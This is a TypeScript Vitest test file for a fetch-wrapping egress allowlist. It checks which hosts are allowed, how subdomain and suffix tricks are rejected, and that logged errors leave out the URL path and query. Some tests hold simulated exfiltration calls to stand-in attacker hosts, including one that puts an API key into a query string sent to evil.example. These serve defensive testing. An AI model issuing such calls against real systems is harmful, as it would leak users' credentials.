/**
 * The egress allowlist (#39).
 *
 * Two things are worth testing here and they are not the same thing. One is the
 * decision — which hosts a given configuration allows — and that is a pure function,
 * so it is tested directly. The other is that the wrapper actually stands between a
 * caller and the network, which needs a fake `fetch` underneath and an assertion that
 * it was never reached.
 *
 * A fresh module graph per case, because `config` validates and freezes at import and
 * the guard keeps module-level `installed` state. The same arrangement `jobs-ai.test.ts`
 * uses for the AI switch.
 */
import { afterEach, describe, expect, it, vi } from 'vitest'

type Egress = typeof import('../../src/egress.ts')

const realFetch = globalThis.fetch

async function freshEgress(env: Record<string, string | undefined> = {}): Promise<Egress> {
  vi.resetModules()
  for (const [key, value] of Object.entries(env)) vi.stubEnv(key, value)
  return await import('../../src/egress.ts')
}

afterEach(() => {
  globalThis.fetch = realFetch
  vi.unstubAllEnvs()
  vi.resetModules()
})

describe('the allowlist', () => {
  it('is built from the same URLs the adapters read', async () => {
    const { allowedHosts } = await freshEgress()
    const hosts = allowedHosts()
    // The test environment points at these two; no second place to keep in step.
    expect(hosts.has('actual.test')).toBe(true)
    expect(hosts.has('ghostfolio.test')).toBe(true)
  })

  it('follows Actual to a new hostname without a second edit', async () => {
    const { allowedHosts } = await freshEgress({ ACTUAL_SERVER_URL: 'https://budget.example.org' })
    const hosts = allowedHosts()
    expect(hosts.has('budget.example.org')).toBe(true)
    expect(hosts.has('actual.test')).toBe(false)
  })

  it('allows one Google host for AI Studio', async () => {
    const { allowedHosts } = await freshEgress({ GEMINI_PROVIDER: 'aistudio' })
    expect(allowedHosts().has('generativelanguage.googleapis.com')).toBe(true)
    expect(allowedHosts().has('europe-west1-aiplatform.googleapis.com')).toBe(false)
  })

  it('derives the regional Vertex host from the configured location', async () => {
    const { allowedHosts } = await freshEgress({
      GEMINI_PROVIDER: 'vertex',
      GEMINI_API_KEY: undefined,
      GOOGLE_CLOUD_PROJECT: 'a-project',
      GOOGLE_CLOUD_LOCATION: 'europe-west4',
    })
    const hosts = allowedHosts()
    expect(hosts.has('europe-west4-aiplatform.googleapis.com')).toBe(true)
    expect(hosts.has('generativelanguage.googleapis.com')).toBe(false)
  })

  it('includes the OIDC issuer, which is a URL and not a hostname', async () => {
    const { allowedHosts } = await freshEgress({
      AUTH_OIDC_ISSUER: 'https://auth.example.org/application/o/balancr/',
      AUTH_OIDC_CLIENT_ID: 'balancr',
      AUTH_OIDC_CLIENT_SECRET: 'shh',
    })
    expect(allowedHosts().has('auth.example.org')).toBe(true)
  })

  it('takes the extra hosts as hostnames, case-folded', async () => {
    const { allowedHosts } = await freshEgress({ EGRESS_EXTRA_HOSTS: 'Proxy.Internal, other.test' })
    const hosts = allowedHosts()
    expect(hosts.has('proxy.internal')).toBe(true)
    expect(hosts.has('other.test')).toBe(true)
  })
})

describe('the decision', () => {
  it('ignores the port, the scheme and the path', async () => {
    const { isAllowed } = await freshEgress()
    const allowed = new Set(['ghostfolio.test'])
    expect(isAllowed('http://ghostfolio.test:3333/api/v1/health', allowed)).toBe(true)
    expect(isAllowed('https://ghostfolio.test/api/v1/portfolio/details', allowed)).toBe(true)
  })

  it('does not let a host imply its subdomains, in either direction', async () => {
    const { isAllowed } = await freshEgress()
    const allowed = new Set(['ghostfolio.test'])
    expect(isAllowed('https://evil.ghostfolio.test/', allowed)).toBe(false)
    // The suffix trick a naive `endsWith` check falls for.
    expect(isAllowed('https://ghostfolio.test.evil.example/', allowed)).toBe(false)
  })

  it('always allows loopback, because the health check is not egress', async () => {
    const { isAllowed } = await freshEgress()
    const none: ReadonlySet<string> = new Set()
    expect(isAllowed('http://127.0.0.1:3000/healthz', none)).toBe(true)
    expect(isAllowed('http://localhost:3000/healthz', none)).toBe(true)
    expect(isAllowed('http://[::1]:3000/healthz', none)).toBe(true)
  })

  it('denies what it cannot parse rather than passing it through', async () => {
    const { isAllowed } = await freshEgress()
    expect(isAllowed('not-a-url', new Set(['actual.test']))).toBe(false)
  })
})

describe('enforce', () => {
  it('lets a configured host through, untouched', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    const res = await fetch('http://ghostfolio.test:3333/api/v1/health')
    expect(await res.text()).toBe('ok')
    expect(inner).toHaveBeenCalledOnce()
  })

  it('refuses an unconfigured host without reaching the network', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard, EgressDeniedError } = await freshEgress()
    installEgressGuard()

    await expect(fetch('https://collector.evil.example/report')).rejects.toThrow(EgressDeniedError)
    expect(inner).not.toHaveBeenCalled()
  })

  /**
   * The reason the denial logs a host and not a URL: on an exfiltration attempt the
   * query string *is* the data. An error message that quoted it would copy the secret
   * into every log aggregator downstream.
   */
  it('names the host and never the path or query it was asked for', async () => {
    globalThis.fetch = (async () => new Response('ok')) as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    const secret = 'gemini-key-abcdef123456'
    const error = await fetch(`https://evil.example/collect?k=${secret}`).catch((e: unknown) => e)
    expect(error).toBeInstanceOf(Error)
    const message = (error as Error).message
    expect(message).toContain('evil.example')
    expect(message).not.toContain(secret)
    expect(message).not.toContain('/collect')
  })

  it('covers a Request object as well as a string and a URL', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()

    await expect(fetch(new Request('https://evil.example/'))).rejects.toThrow(/not allowed/)
    await expect(fetch(new URL('https://evil.example/'))).rejects.toThrow(/not allowed/)
    expect(inner).not.toHaveBeenCalled()
  })
})

describe('the other two modes', () => {
  it('warn allows the call, so a new dependency can be seen before it is judged', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress({ EGRESS_MODE: 'warn' })
    installEgressGuard()

    const res = await fetch('https://collector.evil.example/report')
    expect(await res.text()).toBe('ok')
    expect(inner).toHaveBeenCalledOnce()
  })

  it('off does not wrap fetch at all', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress({ EGRESS_MODE: 'off' })
    installEgressGuard()

    expect(globalThis.fetch).toBe(inner)
  })

  it('installs once, however often it is called', async () => {
    const inner = vi.fn(async () => new Response('ok'))
    globalThis.fetch = inner as unknown as typeof fetch
    const { installEgressGuard } = await freshEgress()
    installEgressGuard()
    const wrapped = globalThis.fetch
    installEgressGuard()
    expect(globalThis.fetch).toBe(wrapped)
  })
})
